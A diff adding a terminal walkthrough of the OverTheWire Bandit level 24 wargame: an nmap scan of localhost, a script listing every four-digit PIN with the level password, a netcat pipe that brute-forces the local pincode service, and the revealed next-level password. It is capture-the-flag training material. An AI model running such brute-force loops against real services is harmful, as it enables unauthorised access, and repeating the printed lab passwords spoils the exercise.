@@ -103,4 +103,65 @@ irc.overthewire.org.
 
   Enjoy your stay!
 
+```
+bandit24@bandit:~$ nmap -p- localhost
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2022-02-11 10:11 CET
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.00026s latency).
+Not shown: 65524 closed ports
+PORT      STATE SERVICE
+22/tcp    open  ssh
+113/tcp   open  ident
+1234/tcp  open  hotline
+30000/tcp open  ndmps
+30001/tcp open  pago-services1
+30002/tcp open  pago-services2
+31046/tcp open  unknown
+31518/tcp open  unknown
+31691/tcp open  unknown
+31790/tcp open  unknown
+31960/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 3.53 seconds
+
+bandit24@bandit:~$ mkdir /tmp/dirbandit24
+
+bandit24@bandit:~$ cd /tmp/dirbandit24
+
+bandit24@bandit:/tmp/dirbandit24$ vim basefile.sh
+
+bandit24@bandit:/tmp/dirbandit24$ cat basefile.sh
+#!/bin/bash
+
+for i in {0000..9999};
+    do
+        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> combinations.txt
+    done
+    
+bandit24@bandit:/tmp/dirbandit24$ chmod +x basefile.sh
+
+bandit24@bandit:/tmp/dirbandit24$ ./basefile.sh
+
+bandit24@bandit:/tmp/dirbandit24$ head -n 4 combinations.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003
+
+bandit24@bandit:/tmp/dirbandit24$ cat combinations.txt | nc localhost 30002 >> result.txt
+
+bandit24@bandit:/tmp/dirbandit24$ sort result.txt | uniq -u
+
+Correct!
+Exiting.
+I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG
+
+bandit24@bandit:/tmp/dirbandit24$ rm -rf /tmp/dirbandit24
+
+bandit24@bandit:/tmp/dirbandit24$ exit
+logout
+Connection to bandit.labs.overthewire.org closed.
+```                  
 
